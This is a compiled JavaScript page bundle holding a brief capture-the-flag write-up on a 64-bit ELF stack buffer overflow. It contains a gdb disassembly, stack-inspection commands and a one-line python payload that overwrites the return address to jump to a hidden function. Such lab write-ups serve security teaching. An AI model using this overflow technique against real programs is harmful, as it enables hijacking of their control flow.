(window.webpackJsonp=window.webpackJsonp||[]).push([[94],{433:function(t,s,a){"use strict";a.r(s);var r=a(13),e=Object(r.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"elfx64-writeup"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#elfx64-writeup"}},[t._v("#")]),t._v(" ELFx64 writeup")]),t._v(" "),s("p",[t._v("Using gdb:")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("Dump of assembler code "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("function")]),t._v(" main:                              \n   0x0000000000400628 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("+"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("0")]),t._v(">")]),t._v(":     push   rbp                             \n   0x0000000000400629 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("+"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("1")]),t._v(">")]),t._v(":     mov    rbp,rsp                         \n   0x000000000040062c "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("+"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("4")]),t._v(">")]),t._v(":     sub    rsp,0x120                       \n   0x0000000000400633 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("+1"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("1")]),t._v(">")]),t._v(":    mov    DWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("rbp-0x114"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(",edi       \n   0x0000000000400639 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("+1"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("7")]),t._v(">")]),t._v(":    mov    QWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("rbp-0x120"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(",rsi       \n   0x0000000000400640 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("+2"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("4")]),t._v(">")]),t._v(":    lea    rax,"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("rbp-0x110"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("                 \n   0x0000000000400647 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("+3"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("1")]),t._v(">")]),t._v(":    mov    rsi,rax                         \n   0x000000000040064a "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("+3"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("4")]),t._v(">")]),t._v(":    lea    rdi,"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("rip+0xd0"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("        "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 0x400721")]),t._v("\n   0x0000000000400651 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("+4"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("1")]),t._v(">")]),t._v(":    mov    eax,0x0                         \n   0x0000000000400656 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("+4"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("6")]),t._v(">")]),t._v(":    call   0x4004f0 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("__isoc99_scanf@plt"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("   \n   0x000000000040065b "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("+5"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("1")]),t._v(">")]),t._v(":    lea    rax,"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("rbp-0x110"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("                 \n   0x0000000000400662 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("+5"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("8")]),t._v(">")]),t._v(":    mov    rdi,rax                         \n   0x0000000000400665 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("+6"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("1")]),t._v(">")]),t._v(":    call   0x4004c0 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("strlen@plt"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("           \n   0x000000000040066a "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("+6"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("6")]),t._v(">")]),t._v(":    mov    DWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("rbp-0x4"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(",eax         \n   0x000000000040066d "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("+6"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("9")]),t._v(">")]),t._v(":    lea    rax,"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("rbp-0x110"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("                 \n   0x0000000000400674 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("+7"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("6")]),t._v(">")]),t._v(":    mov    rsi,rax                         \n   0x0000000000400677 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("+7"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("9")]),t._v(">")]),t._v(":    lea    rdi,"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("rip+0xa6"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("        "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 0x400724")]),t._v("\n   0x000000000040067e "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("+8"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("6")]),t._v(">")]),t._v(":    mov    eax,0x0                         \n   0x0000000000400683 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("+9"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("1")]),t._v(">")]),t._v(":    call   0x4004d0 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("printf@plt"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("           \n   0x0000000000400688 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("+9"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("6")]),t._v(">")]),t._v(":    mov    eax,0x0                         \n   0x000000000040068d "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("+10"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("1")]),t._v(">")]),t._v(":   leave                                  \n   0x000000000040068e "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("+10"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("2")]),t._v(">")]),t._v(":   ret                                    \nEnd of assembler dump.                                                 \n")])])]),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("gdb ./ch35\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("gdb"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" disas main\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("gdb"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("break")]),t._v(" * main+46\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("gdb"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" x/120x "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$rsp")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# this is to check the stack before")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("gdb"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" x/120x "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$rsp")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# this is to check the stack after writing to the buffer")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("gdb"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" print callMeMaybe "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# we need this address to use as our new return address")]),t._v("\n")])])]),s("p",[t._v("We see that 0x110 is allocated on the stack, then we need to add 8 more bytes (64 bit) to overwrite the $rbp register.")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("((")]),t._v("python "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-c")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('\'print("A"*280 "\\xe7\\x05\\x40\\x00\\x00\\x00\\x00\\x00")\'')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("cat")]),t._v(" - "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ./ch35\n")])])])])}),[],!1,null,null,null);s.default=e.exports}}]);